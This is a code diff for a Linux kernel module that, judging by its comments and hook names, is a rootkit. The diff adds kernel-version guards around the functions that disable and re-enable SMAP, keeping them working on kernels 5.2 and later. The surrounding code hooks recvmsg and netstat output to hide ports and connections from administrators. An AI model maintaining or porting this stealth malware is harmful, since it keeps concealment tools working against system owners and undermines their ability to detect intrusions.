@@ -4,6 +4,7 @@
 #include <linux/inet_diag.h>
 #include <linux/byteorder/generic.h>
 #include <asm/smap.h>
+#include <linux/version.h>
 
 #include "common.h"
 #include "hook.h"
@@ -165,17 +166,25 @@ remove_port_from_list(port_list_t_ptr list, port_t port, proto proto)
 // https://elixir.bootlin.com/linux/v4.19/source/arch/x86/include/asm/smap.h#L58
 static inline void
 disable_smap(void) {
+#if LINUX_VERSION_CODE < KERNEL_VERSION(5, 2, 0)
     alternative("", __stringify(__ASM_STAC), X86_FEATURE_SMAP);
+#else
+    alternative("", __ASM_STAC, X86_FEATURE_SMAP);
+#endif
 }
 
 // https://elixir.bootlin.com/linux/v4.19/source/arch/x86/include/asm/smap.h#L52
 static inline void
 enable_smap(void) {
+#if LINUX_VERSION_CODE < KERNEL_VERSION(5, 2, 0)
     alternative("", __stringify(__ASM_CLAC), X86_FEATURE_SMAP);
+#else
+    alternative("", __ASM_CLAC, X86_FEATURE_SMAP);
+#endif
 }
 
 /**
- * SS-Hiding 
+ * SS-Hiding
  * We rely on disabling SMAP, because gathering
  * the total packet length is tedious
  * (Or we just didn't find the right way)
@@ -185,7 +194,6 @@ enable_smap(void) {
  * https://elixir.bootlin.com/linux/v4.19/source/include/net/netlink.h (protocol stuff)
  * https://elixir.bootlin.com/linux/v4.19/source/include/linux/netlink.h (macros)
  **/
-
 asmlinkage ssize_t
 g7_recvmsg(struct pt_regs *pt_regs)
 {
@@ -223,7 +231,7 @@ g7_recvmsg(struct pt_regs *pt_regs)
 
 
 /**
- * Netstat-Hiding 
+ * Netstat-Hiding
  **/
 
 //seq and v include all the info we need
